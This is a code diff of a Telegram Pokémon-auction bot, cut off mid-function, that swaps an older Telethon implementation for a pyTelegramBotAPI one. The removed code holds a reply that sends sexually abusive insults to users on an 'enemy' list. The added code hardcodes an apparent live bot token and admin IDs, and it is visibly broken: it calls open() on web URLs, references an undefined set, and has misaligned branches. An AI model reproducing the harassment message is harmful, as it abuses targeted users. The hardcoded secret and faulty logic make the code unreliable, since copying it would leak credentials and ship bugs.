@@ -1,812 +1,588 @@
-import os
-from telethon.tl.functions.channels import GetParticipantsRequest
-from telethon.tl.types import ChannelParticipantsSearch
-from time import sleep
-from telethon.tl.types import MessageEntityCode
-from telethon import TelegramClient, events, Button
-import telethon.sync #lol copied from docs
-import asyncio
-import logging
-import asyncio
-from telethon import events
-from telethon.errors import UserNotParticipantError
-from telethon.tl.functions.channels import GetParticipantRequest
-from telethon.tl.types import ChannelParticipantAdmin
-from telethon.tl.types import ChannelParticipantCreator
+#6882194604
 
-API_ID = os.environ.get('API_ID', None)
-API_HASH = os.environ.get('API_HASH', None)
-TOKEN = os.environ.get('TOKEN', None)
-PENDING_CHANNEL = os.environ.get('PENDING_CHANNEL', None)
-POST_CHANNEL = os.environ.get('POST_CHANNEL', None)
-SCAMMER_CHANNEL = os.environ.get('SCAMMER_CHANNEL', None)
-REJECT_CHANNEL = os.environ.get('REJECT_CHANNEL', None)
-APPROVE_CHANNEL = os.environ.get('APPROVE_CHANNEL', None)
-OWNER_USERNAME = os.environ.get('OWNER_USERNAME', None)
-AUCTION_GROUP_LINK = os.environ.get('AUCTION_GROUP_LINK', None)
-AUCTION_CHANNEL_LINK = os.environ.get('AUCTION_CHANNEL_LINK', None)
-START_IMAGE = os.environ.get('START_IMAGE', None)
-START_CAPTION = os.environ.get('START_CAPTION', None)
-PENDING_CHANNEL_LINK = os.environ.get('PENDING_CHANNEL_LINK', None)
-APPROVED_CHANNEL_LINK = os.environ.get('APPROVED_CHANNEL_LINK', None)
-REJECTED_CHANNEL_LINK = os.environ.get('REJECTED_CHANNEL_LINK', None)
-SCAMMER_CHANNEL_LINK = os.environ.get('SCAMMER_CHANNEL_LINK', None)
-COMMUNITY_NAME = os.environ.get('COMMUNITY_NAME', None)
-COMMUNITY_LINK = os.environ.get('COMMUNITY_LINK', None)
-APPROVE_LIST = set(int(x) for x in os.environ.get("APPROVE_LIST", "").split())
-ENEMY_LIST = set(int(x) for x in os.environ.get("ENEMY_LIST", "").split())
+import telebot
+from telebot import types
+import time
 
+# Replace 'YOUR_TOKEN' with your actual Telegram Bot token
+bot = telebot.TeleBot("7167579834:AAFmpwPdKHT6eE4aELSOB8CC8gi_tPrutPA")
 
-api_id = API_ID
-api_hash = API_HASH
-bot_token = TOKEN
-log_channel = PENDING_CHANNEL
-post_channel = POST_CHANNEL
-log_channel = int(log_channel)
-post_channel = int(post_channel)
-scammer_channel = int(SCAMMER_CHANNEL)
-reject_channel = int(REJECT_CHANNEL)
-approve_channel = int(APPROVE_CHANNEL)
-START_CAPTION = str(START_CAPTION)
-COMMUNITY_LINK = str(COMMUNITY_LINK)
-OWNER_LINK = 'https://t.me/'+OWNER_USERNAME
-OWNER_LINK = str(OWNER_LINK)
-AUCTION_CHANNEL_LINK = str(AUCTION_CHANNEL_LINK)
-AUCTION_GROUP_LINK = str(AUCTION_GROUP_LINK)
-dxgays = ENEMY_LIST
-xmods = APPROVE_LIST
+# Dictionary to store whether a user has joined each group
+user_groups = {}
 
-client = TelegramClient('aucbot', api_id, api_hash).start(bot_token=bot_token) #i dont really understand it lol but without this bot wont work
+started_users = set()
 
-logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s', #copy pasted from telethon docs lol..... so usually it logs error
-                    level=logging.WARNING)
+# List to store banned user IDs
+banned_users = set()
 
-
-
-@client.on(events.NewMessage(pattern='/start'))
-async def start(event):
-    sender = await event.get_sender()
-    await client.send_file(event.sender_id, START_IMAGE, caption = START_CAPTION
-        ,
-        buttons=[
-        [
-            Button.url('AUCTION', AUCTION_GROUP_LINK),
-            Button.url('CHANNEL', AUCTION_CHANNEL_LINK)
-        ],
-        [
-            Button.url('OWNER', OWNER_LINK),
-            Button.inline('ABOUT', 'ABOUT')
-        ], 
-        [
-            Button.url(COMMUNITY_NAME, COMMUNITY_LINK)
-        ]
-      ]
-    )
-
-
-
-@client.on(events.CallbackQuery(data='ABOUT'))
-async def submitcb(event):
-    await client.edit_message(event.sender_id, event.message_id, "Hey!\nMy developer - @GOJOXSATROU\n\nDo you want to make a similar bot?\n~Check the buttons given below", 
-        buttons=[
-        [
-            Button.url('CODES', 'https://github.com/usaop33/auctionbot')
-        ],
-        [
-            Button.url('DIRECT DEPLOY', 'https://heroku.com/deploy?template=https://github.com/usaop33/auctionbot')
-        ],
-        [
-            Button.url('OWNER', 'https://t.me/gojoxsatrou'),
-            Button.url('X MOD', 'https://t.me/xmodnews')
-        ],
-        [
-            Button.inline('Back', 'BAMCK')
-        ]
-      ]  
-    )
-
-@client.on(events.CallbackQuery(data='BAMCK'))
-async def submitcb(event):
-    await client.edit_message(event.sender_id, event.message_id, START_CAPTION
-        ,
-        buttons=[
-        [
-            Button.url('AUCTION', AUCTION_GROUP_LINK),
-            Button.url('CHANNEL', AUCTION_CHANNEL_LINK)
-        ],
-        [
-            Button.url('OWNER', OWNER_LINK),
-            Button.inline('ABOUT', 'ABOUT')
-        ],
-        [
-            Button.url(COMMUNITY_NAME, COMMUNITY_LINK)
-        ]
-      ]
-    )
-
-user_cache = {}
-
-@client.on(events.NewMessage(pattern='/sell'))
-async def sell(event):
-    sender = await event.get_sender()
-    user_id = event.sender_id
-    if user_id in dxgays:
-        await client.send_message(event.sender_id, "Ho Ho Ho\n\nIf you want to sell something in auction how about you sell your mom to xmods. Altough your moms are already free WHORE whose price is free for a year to use by anyone and they have such loose pussy.\n\n"+sender.first_name+" mom has got best whore award, "+sender.first_name+" is trying to find about his real dad, when "+sender.first_name+" fill any form in father section he writes xmods and 3.97 billion other." )
+# Handler for /start command
+@bot.message_handler(commands=['start'])
+def handle_start(message):
+    if str(message.from_user.id) in banned_users:
+        bot.reply_to(message, "YOU ARE BANNED")
     else:
-        if sender.username:
-            await client.send_message(event.sender_id, "Hello @"+sender.username+"!\n\nWould you like to sell something in auction"
-                ,
-                buttons=[
-                [
-                    Button.inline('Yes', 'yes')
-                ],
-                [
-                    Button.inline('No', 'No')
-                ]
-              ]
-            )
+        user_id = message.from_user.id
+        user_name = message.from_user.first_name
+        if user_groups.get(user_id, False):
+            bot.reply_to(message, "Do /cmds for commands")
         else:
-            await client.send_message(event.sender_id, "Hello!\n\nWould you like to sell something in auction"
-                ,
-                buttons=[
-                [
-                    Button.inline('Yes', 'yes')
-                ],
-                [
-                    Button.inline('No', 'No')
-                ]
-              ]
-            )
-
-
-@client.on(events.CallbackQuery(data='yes'))
-async def yescb(event):
-    await client.edit_message(event.sender_id, event.message_id, "So what would you like to sell?"
-        ,
-        buttons=[
-        [
-            Button.inline('LEGENDARY', 'legendary')
-        ],
-        [
-            Button.inline('0L/NON LEGENDARY', 'ol')
-        ],
-        [
-            Button.inline('SHINY', 'shiny')
-        ],
-        [
-            Button.inline('TMS', 'tms')
-        ]
-     ]
-    )
-    
-@client.on(events.CallbackQuery(data='No'))
-async def legendarycb(event):
-    await client.edit_message(event.sender_id, event.message_id, 'OK! Have a great day', buttons=Button.clear())
-
-@client.on(events.CallbackQuery(data='legendary'))
-async def legendarycb(event):
-    await client.edit_message(event.sender_id, event.message_id, 'OK! Legendary', buttons=Button.clear())
-    sender = await event.get_sender()
-    user_id = event.sender_id
-    msgid = event.message_id
-    sheesh = str(user_id)
-    if sender.username:
-        async with client.conversation(user_id) as conv:
-            await conv.send_message('Forward Nature Pic of pokemon')
-            response = await conv.get_response(timeout = 90000)
-            if response.media:
-                name = response.text
-                sugma = name
-                print(sugma)
-                await conv.send_message('Forward Evs Pic of pokemon')
-                respo =  await conv.get_response(timeout = 90000)
-                if respo.media:
-                    lol = respo.text
-                    huh = respo.media
-                    user_cache[user_id] = {}
-                    user_cache[user_id]['ID'] = user_id
-                    user_cache[user_id]['image'] = huh
-                    await conv.send_message('Forward moveset pic of pokemon')
-                    x = await conv.get_response(timeout = 90000)
-                    if x.media:
-                        lmao = x.text
-                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
-                        theta = await conv.get_response(timeout = 90000)
-                        alpha = theta.text
-                        await conv.send_message('Set base')
-                        bbb = await conv.get_response(timeout = 90000)
-                        ccc = bbb.text
-                        hmm = "#Legendary\nUser id - "+sheesh+"\nUsername : @"+sender.username+"\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
-                        ligma = "huh"
-                        user_cache[user_id]['text'] = hmm
-                        await client.send_file(event.sender_id, file = huh, caption = hmm
-                            ,
-                            buttons=[
-                            [
-                                Button.inline('SUBMIT', 'submit')
-                            ],
-                            [
-                                Button.inline('Delete', 'delete')
-                            ]
-                          ]
-                        )
-                    else:
-                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
+                if not all(user_groups.get(user_id, {}).values()):
+                    bot.send_message(message.chat.id, "Please join all groups first by clicking the buttons below.")
                 else:
-                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
-            else:
-                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
+                    welcome_message = ("🔸Welcome, {} To Auction Bot\n\n"
+                            "🔸You Can Submit Your Pokemon Through This Bot For Auction\n\n"
+                            "🔻But Before Using You Have To Join Our Auction Group By Clicking Below Two Buttons "
+                            "And Then Click 'Joined' Button").format(user_name)
+                markup = types.InlineKeyboardMarkup(row_width=1)
+                auction_group_button = types.InlineKeyboardButton("Join Auction Group", url="https://t.me/DBA_HEXA_AUCTION")
+                trade_group_button = types.InlineKeyboardButton("Join Trade Group", url="https://t.me/DBA_HEXA_TRADE")
+                joined_button = types.InlineKeyboardButton("Joined", callback_data="joined")
+                markup.add(auction_group_button, trade_group_button, joined_button)
+                bot.send_photo(message.chat.id, open('https://telegra.ph//file/33a7bd56c58e085ddbee4.jpg', 'rb'), caption=welcome_message, reply_markup=markup)
+                user_id = message.from_user.id
+                started_users.add(user_id)
+                user_id = message.from_user.id
+                user_ids.add(user_id)
+
+# Handler for 'Joined' button callback
+@bot.callback_query_handler(func=lambda call: call.data == "joined")
+def joined_callback(call):
+    user_id = call.from_user.id
+    if user_id not in user_groups:
+        user_groups[user_id] = {}
+    user_groups[user_id][call.message.chat.id] = True
+    bot.answer_callback_query(call.id, "Thanks for joining our group")
+
+# Handler for /cmds command
+@bot.message_handler(commands=['cmds'])
+def handle_cmds(message):
+    if str(message.from_user.id) in banned_users:
+        bot.reply_to(message, "YOU ARE BANNED")
     else:
-        async with client.conversation(user_id) as conv:
-            await conv.send_message('Forward Nature Pic of pokemon')
-            response = await conv.get_response(timeout = 90000)
-            if response.media:
-                name = response.text
-                sugma = name
-                print(sugma)
-                await conv.send_message('Forward Evs Pic of pokemon')
-                respo =  await conv.get_response(timeout = 90000)
-                if respo.media:
-                    lol = respo.text
-                    huh = respo.media
-                    user_cache[user_id] = {}
-                    user_cache[user_id]['ID'] = user_id
-                    user_cache[user_id]['image'] = huh
-                    await conv.send_message('Forward moveset pic of pokemon')
-                    x = await conv.get_response(timeout = 90000)
-                    if x.media:
-                        lmao = x.text
-                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
-                        theta = await conv.get_response(timeout = 90000)
-                        alpha = theta.text
-                        await conv.send_message('Set base')
-                        bbb = await conv.get_response(timeout = 90000)
-                        ccc = bbb.text
-                        hmm = "#Legendary\nUser id - "+sheesh+"\nUsername : NO USERNAME\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
-                        ligma = "huh"
-                        user_cache[user_id]['text'] = hmm
-                        await client.send_file(event.sender_id, file = huh, caption = hmm
-                            ,
-                            buttons=[
-                            [
-                                Button.inline('SUBMIT', 'submit')
-                            ],
-                            [
-                                Button.inline('Delete', 'delete')
-                            ]
-                          ]
-                        )
-                    else:
-                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
-                else:
-                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
-            else:
-                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
+        user_id = message.from_user.id
+        if user_groups.get(user_id, False):
+            bot.reply_to(message, '''
+                     USER COMMANDS : - 
 
-@client.on(events.CallbackQuery(data='ol'))
-async def legendarycb(event):
-    await client.edit_message(event.sender_id, event.message_id, 'OK! NON Legendary', buttons=Button.clear())
-    sender = await event.get_sender()
-    user_id = event.sender_id
-    msgid = event.message_id
-    sheesh = str(user_id)
-    if sender.username:
-        async with client.conversation(user_id) as conv:
-            await conv.send_message('Forward Nature Pic of pokemon')
-            response = await conv.get_response(timeout = 90000)
-            if response.media:
-                name = response.text
-                sugma = name
-                print(sugma)
-                await conv.send_message('Forward Evs Pic of pokemon')
-                respo =  await conv.get_response(timeout = 90000)
-                if respo.media:
-                    lol = respo.text
-                    huh = respo.media
-                    user_cache[user_id] = {}
-                    user_cache[user_id]['ID'] = user_id
-                    user_cache[user_id]['image'] = huh
-                    await conv.send_message('Forward moveset pic of pokemon')
-                    x = await conv.get_response(timeout = 90000)
-                    if x.media:
-                        lmao = x.text
-                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
-                        theta = await conv.get_response(timeout = 90000)
-                        alpha = theta.text
-                        await conv.send_message('Set base')
-                        bbb = await conv.get_response(timeout = 90000)
-                        ccc = bbb.text
-                        hmm = "#Non_Legendary\nUser id - "+sheesh+"\nUsername : @"+sender.username+"\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
-                        ligma = "huh"
-                        user_cache[user_id]['text'] = hmm
-                        await client.send_file(event.sender_id, file = huh, caption = hmm
-                            ,
-                            buttons=[
-                            [
-                                Button.inline('SUBMIT', 'submit')
-                            ],
-                            [
-                                Button.inline('Delete', 'delete')
-                            ]
-                          ]
-                        )
-                    else:
-                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
-                else:
-                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
-            else:
-                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
+/start - Start The Bot
+/add - Send Poke / TMs For Auction
+/cancel - Cancel All Running Cmds
+/item - List Of All Items In Auc
+/natures - Get Natures Page 
+/cmds - Get This Message
+                     
+ADMINS COMMANDS : - 
+                     
+/users - Get All Bot Users List
+/list - Get List Of All Items In Auction 
+/ban - Ban Any User
+/unban - Unban Any User
+/msg - Send Message To User
+/approve - Make Someone Bot Admin
+/broad - Send Message To All Bot 
+/next - Send Next Item In Auction
+/unapprove - Remove Someone Bot Admin
+                     
+OWNER COMMANDS :-
+
+/clear - For Bot Owner''')
+        else:
+            bot.reply_to(message, "Please join our groups first by clicking the buttons in the start message.")
+
+# List to store active user IDs
+active_users = []
+
+# Admin IDs
+admin_ids = ["6882194604", "6843210459"]
+
+# Handler for /users command
+@bot.message_handler(commands=['users'])
+def handle_users(message):
+    if str(message.from_user.id) in banned_users:
+        bot.reply_to(message, "YOU ARE BANNED")
     else:
-        async with client.conversation(user_id) as conv:
-            await conv.send_message('Forward Nature Pic of pokemon')
-            response = await conv.get_response(timeout = 90000)
-            if response.media:
-                name = response.text
-                sugma = name
-                print(sugma)
-                await conv.send_message('Forward Evs Pic of pokemon')
-                respo =  await conv.get_response(timeout = 90000)
-                if respo.media:
-                    lol = respo.text
-                    huh = respo.media
-                    user_cache[user_id] = {}
-                    user_cache[user_id]['ID'] = user_id
-                    user_cache[user_id]['image'] = huh
-                    await conv.send_message('Forward moveset pic of pokemon')
-                    x = await conv.get_response(timeout = 90000)
-                    if x.media:
-                        lmao = x.text
-                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
-                        theta = await conv.get_response(timeout = 90000)
-                        alpha = theta.text
-                        await conv.send_message('Set base')
-                        bbb = await conv.get_response(timeout = 90000)
-                        ccc = bbb.text
-                        hmm = "#Non_Legendary\nUser id - "+sheesh+"\nUsername : NO USERNAME\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
-                        ligma = "huh"
-                        user_cache[user_id]['text'] = hmm
-                        await client.send_file(event.sender_id, file = huh, caption = hmm
-                            ,
-                            buttons=[
-                            [
-                                Button.inline('SUBMIT', 'submit')
-                            ],
-                            [
-                                Button.inline('Delete', 'delete')
-                            ]
-                          ]
-                        )
-                    else:
-                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
-                else:
-                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
-            else:
-                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
+        user_id = message.from_user.id
+        if str(user_id) in admin_ids:
+            num_users = len(started_users)
+            bot.send_message(message.chat.id, f"Total users who started the bot: {num_users}")
+        else:
+            bot.send_message(message.chat.id, "You are not authorized to use this command.")
 
-@client.on(events.CallbackQuery(data='shiny'))
-async def legendarycb(event):
-    await client.edit_message(event.sender_id, event.message_id, 'OK! Shiny', buttons=Button.clear())
-    sender = await event.get_sender()
-    user_id = event.sender_id
-    msgid = event.message_id
-    sheesh = str(user_id)
-    if sender.username:
-        async with client.conversation(user_id) as conv:
-            await conv.send_message('Forward Nature Pic of pokemon')
-            response = await conv.get_response(timeout = 90000)
-            if response.media:
-                name = response.text
-                sugma = name
-                print(sugma)
-                await conv.send_message('Forward Evs Pic of pokemon')
-                respo =  await conv.get_response(timeout = 90000)
-                if respo.media:
-                    lol = respo.text
-                    huh = respo.media
-                    user_cache[user_id] = {}
-                    user_cache[user_id]['ID'] = user_id
-                    user_cache[user_id]['image'] = huh
-                    await conv.send_message('Forward moveset pic of pokemon')
-                    x = await conv.get_response(timeout = 90000)
-                    if x.media:
-                        lmao = x.text
-                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
-                        theta = await conv.get_response(timeout = 90000)
-                        alpha = theta.text
-                        await conv.send_message('Set base')
-                        bbb = await conv.get_response(timeout = 90000)
-                        ccc = bbb.text
-                        hmm = "#Shiny\nUser id - "+sheesh+"\nUsername : @"+sender.username+"\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
-                        ligma = "huh"
-                        user_cache[user_id]['text'] = hmm
-                        await client.send_file(event.sender_id, file = huh, caption = hmm
-                            ,
-                            buttons=[
-                            [
-                                Button.inline('SUBMIT', 'submit')
-                            ],
-                            [
-                                Button.inline('Delete', 'delete')
-                            ]
-                          ]
-                        )
-                    else:
-                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
-                else:
-                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
-            else:
-                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
+@bot.message_handler(commands=['natures'])
+def handle_natures(message):
+    if str(message.from_user.id) in banned_users:
+        bot.reply_to(message, "YOU ARE BANNED")
     else:
-        async with client.conversation(user_id) as conv:
-            await conv.send_message('Forward Nature Pic of pokemon')
-            response = await conv.get_response(timeout = 90000)
-            if response.media:
-                name = response.text
-                sugma = name
-                print(sugma)
-                await conv.send_message('Forward Evs Pic of pokemon')
-                respo =  await conv.get_response(timeout = 90000)
-                if respo.media:
-                    lol = respo.text
-                    huh = respo.media
-                    user_cache[user_id] = {}
-                    user_cache[user_id]['ID'] = user_id
-                    user_cache[user_id]['image'] = huh
-                    await conv.send_message('Forward moveset pic of pokemon')
-                    x = await conv.get_response(timeout = 90000)
-                    if x.media:
-                        lmao = x.text
-                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
-                        theta = await conv.get_response(timeout = 90000)
-                        alpha = theta.text
-                        await conv.send_message('Set base')
-                        bbb = await conv.get_response(timeout = 90000)
-                        ccc = bbb.text
-                        hmm = "#Shiny\nUser id - "+sheesh+"\nUsername : NO USERNAME\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
-                        ligma = "huh"
-                        user_cache[user_id]['text'] = hmm
-                        await client.send_file(event.sender_id, file = huh, caption = hmm
-                            ,
-                            buttons=[
-                            [
-                                Button.inline('SUBMIT', 'submit')
-                            ],
-                            [
-                                Button.inline('Delete', 'delete')
-                            ]
-                          ]
-                        )
-                    else:
-                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
-                else:
-                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
-            else:
-                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
+        # Replace 'nature.jpg' with the path to your nature photo
+        photo = open('https://telegra.ph//file/a5709331d1e08445ee317.jpg', 'rb')
+        bot.send_photo(message.chat.id, photo)
+        photo.close()
 
-@client.on(events.CallbackQuery(data='tms'))
-async def tmscb(event):
-    await client.edit_message(event.sender_id, event.message_id, 'OK! TMS', buttons=Button.clear())
-    sender = await event.get_sender()
-    user_id = event.sender_id
-    msgid = event.message_id
-    sheesh = str(user_id)
-    if sender.username:
-        async with client.conversation(user_id) as conv:
-            await conv.send_message('Forward TM')
-            response = await conv.get_response(timeout = 90000)
-            name = response.text
-            await conv.send_message('ENTER BASE')
-            respo =  await conv.get_response(timeout = 90000)
-            lol = respo.text
-            user_cache[user_id] = {}
-            user_cache[user_id]['ID'] = user_id
-            hmm = "#TMS\nUser id - "+sheesh+"\nUsername : @"+sender.username+"\n\nAbout TM:- \n"+name+"\n\nBase - "+lol
-            user_cache[user_id]['text'] = hmm
-            await client.send_message(event.sender_id, hmm
-                ,
-               buttons=[
-                [
-                    Button.inline('SUBMIT', 'submi')
-                ],
-                [
-                    Button.inline('Delete', 'delet')
-                ]
-              ]
-            )
-    else:
-        async with client.conversation(user_id) as conv:
-            await conv.send_message('Forward TM')
-            response = await conv.get_response(timeout = 90000)
-            name = response.text
-            await conv.send_message('ENTER BASE')
-            respo =  await conv.get_response(timeout = 90000)
-            lol = respo.text
-            user_cache[user_id] = {}
-            user_cache[user_id]['ID'] = user_id
-            hmm = "#TMS\nUser id - "+sheesh+"\nUsername : NO USERNAME\n\nAbout TM:- \n"+name+"\n\nBase - "+lol
-            user_cache[user_id]['text'] = hmm
-            await client.send_file(event.sender_id, file = huh, caption = hmm
-                ,
-               buttons=[
-                [
-                    Button.inline('SUBMIT', 'submi')
-                ],
-                [
-                    Button.inline('Delete', 'delet')
-                ]
-              ]
-            )
+admin_id = [6882194604, 6843210459]
 
+# Handler for /msg command
+@bot.message_handler(commands=['msg'])
+def handle_msg(message):
+    # Check if the user is an admin
+    if message.from_user.id not in admin_id:
+        bot.reply_to(message, "You are not authorized to use this command.")
+        return
 
-@client.on(events.CallbackQuery(data='submi'))
-async def submitcb(event):
-  await client.edit_message(event.sender_id, event.message_id, user_cache[event.sender_id]['text']+"\n\nSUBMITED\nUsally it take 3-4 hour to get accepted or rejected.\nCheck the buttons given below", 
-        buttons=[
-        [
-            Button.url('PENDING', PENDING_CHANNEL_LINK)
-        ],
-        [
-            Button.url('APPROVED', APPROVED_CHANNEL_LINK),
-            Button.url('REJECTED', REJECTED_CHANNEL_LINK)
-        ],
-        [
-            Button.url('AUCTION GROUP', AUCTION_GROUP_LINK)
-        ]
-       ]
-      )
-  await client.send_message(log_channel, user_cache[event.sender_id]['text']
-        ,
-        buttons=[
-        [
-            Button.inline('APPROVE', 'approve'),
-            Button.inline('REJECT', 'reject')
-        ],
-        [
-            Button.inline('REJECT TRASH', 'rejtrash')
-        ],
-        [
-            Button.inline('REJECT INCOMPLETE', 'rejinco')
-        ],
-        [
-            Button.inline('REJECT HIGHBASE', 'highbase')
-        ],
-        [
-            Button.inline('REPORT AS SCAMMER', 'scammer')
-        ]
-      ]
-    )                                    
-                                    
-@client.on(events.CallbackQuery(data='delet'))
-async def deletecb(event):
-    await client.edit_message(event.sender_id, event.message_id, "RESPONSE DELETED", buttons=Button.clear())                                    
-                               
-                                    
-@client.on(events.CallbackQuery(data='submit'))
-async def submitcb(event):
-    await client.edit_message(event.sender_id, event.message_id, user_cache[event.sender_id]['text']+"\n\nSUBMITED\nUsally it take 3-4 hour to get accepted or rejected.\nCheck the buttons given below", 
-        buttons=[
-        [
-            Button.url('PENDING', PENDING_CHANNEL_LINK)
-        ],
-        [
-            Button.url('APPROVED', APPROVED_CHANNEL_LINK),
-            Button.url('REJECTED', REJECTED_CHANNEL_LINK)
-        ],
-        [
-            Button.url('AUCTION GROUP', AUCTION_GROUP_LINK)
-        ]
-       ]
-      )
-    await client.send_file(log_channel, user_cache[event.sender_id]['image'], caption = user_cache[event.sender_id]['text']
-        ,
-        buttons=[
-        [
-            Button.inline('APPROVE', 'approve'),
-            Button.inline('REJECT', 'reject')
-        ],
-        [
-            Button.inline('REJECT TRASH', 'rejtrash')
-        ],
-        [
-            Button.inline('REJECT INCOMPLETE', 'rejinco')
-        ],
-        [
-            Button.inline('REJECT HIGHBASE', 'highbase')
-        ],
-        [
-            Button.inline('REPORT AS SCAMMER', 'scammer')
-        ]
-      ]
-    )
-
-@client.on(events.CallbackQuery(data='delete'))
-async def deletecb(event):
-    await client.edit_message(event.sender_id, event.message_id, "RESPONSE DELETED", buttons=Button.clear())
-
-@client.on(events.CallbackQuery(data='approve'))
-async def approvecb(event):
-    fuck = event.sender_id
-    user_id = event.sender_id
-    fucker = await event.get_sender()
-    if user_id in xmods:
-        noyou = await event.get_sender()
-        sender = await event.get_sender()
-        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
-        await client.forward_messages(post_channel, event.message_id, log_channel)
-        await client.forward_messages(approve_channel, event.message_id, log_channel)
-        await client.send_message(approve_channel, "Accepted by @"+fucker.username)
-        await client.delete_messages(log_channel, event.message_id)
-    else:
-        await event.answer('You are not the auctioneer', alert=True)
-
-@client.on(events.CallbackQuery(data='reject'))
-async def approvecb(event):
-    fuck = event.sender_id
-    user_id = event.sender_id
-    fucker = await event.get_sender()
-    if user_id in xmods:
-        noyou = await event.get_sender()
-        sender = await event.get_sender()
-        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
-        await client.forward_messages(reject_channel, event.message_id, log_channel)
-        await client.send_message(reject_channel, "Rejected by @"+fucker.username)
-        await client.delete_messages(log_channel, event.message_id)
-    else:
-        await event.answer('You are not the auctioneer', alert=True)
-
-@client.on(events.CallbackQuery(data='rejtrash'))
-async def approvecb(event):
-    fuck = event.sender_id
-    user_id = event.sender_id
-    fucker = await event.get_sender()
-    if user_id in xmods:
-        noyou = await event.get_sender()
-        sender = await event.get_sender()
-        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
-        await client.forward_messages(reject_channel, event.message_id, log_channel)
-        await client.send_message(reject_channel, "Rejected trash. Rejected by @"+fucker.username)
-        await client.delete_messages(log_channel, event.message_id)
-    else:
-        await event.answer('You are not the auctioneer', alert=True)
-
-@client.on(events.CallbackQuery(data='rejinco'))
-async def approvecb(event):
-    fuck = event.sender_id
-    user_id = event.sender_id
-    fucker = await event.get_sender()
-    if user_id in xmods:
-        noyou = await event.get_sender()
-        sender = await event.get_sender()
-        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
-        await client.forward_messages(reject_channel, event.message_id, log_channel)
-        await client.send_message(reject_channel, "Rejected incomplete details. Rejected by @"+fucker.username)
-        await client.delete_messages(log_channel, event.message_id)
-    else:
-        await event.answer('You are not the auctioneer', alert=True)
-        
-@client.on(events.CallbackQuery(data='highbase'))
-async def approvecb(event):
-    fuck = event.sender_id
-    user_id = event.sender_id
-    fucker = await event.get_sender()
-    if user_id in xmods:
-        noyou = await event.get_sender()
-        sender = await event.get_sender()
-        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
-        await client.forward_messages(reject_channel, event.message_id, log_channel)
-        await client.send_message(reject_channel, "Rejected because high base. Rejected by @"+fucker.username)
-        await client.delete_messages(log_channel, event.message_id)
-    else:
-        await event.answer('You are not the auctioneer', alert=True)
-
-@client.on(events.CallbackQuery(data='scammer'))
-async def approvecb(event):
-    fuck = event.sender_id
-    user_id = event.sender_id
-    fucker = await event.get_sender()
-    if user_id in xmods:
-        noyou = await event.get_sender()
-        sender = await event.get_sender()
-        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
-        await client.forward_messages(scammer_channel, event.message_id, log_channel)
-        await client.send_message(scammer_channel, "Reported as scammer. Reported by @"+fucker.username)
-        await client.delete_messages(log_channel, event.message_id)
-    else:
-        await event.answer('You are not the auctioneer', alert=True)
-        
-spam_chats = []
-
-@client.on(events.NewMessage(pattern="^/tagall|@all|/all ?(.*)"))
-async def mentionall(event):
-    chat_id = event.chat_id
-    if event.is_private:
-        return await event.respond(
-            "__This command can be use in groups and channels!__"
-        )
-
-    is_admin = False
+    # Extract user ID and message from the command
     try:
-        partici_ = await client(GetParticipantRequest(event.chat_id, event.sender_id))
-    except UserNotParticipantError:
-        is_admin = False
-    else:
-        if isinstance(
